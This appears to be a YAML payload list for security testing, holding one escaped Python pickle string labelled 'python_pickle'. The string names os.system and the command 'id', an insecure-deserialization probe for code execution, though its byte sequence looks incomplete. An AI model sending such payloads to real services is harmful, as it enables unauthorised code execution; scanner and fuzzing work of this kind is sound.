python_payloads:
  - - python_pickle
    - '\\x80\\x04\\x95\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x04os\\x94\\x8c\\x06system\\x94\\x8c\\x04id\\x94\\x93\\x94.'
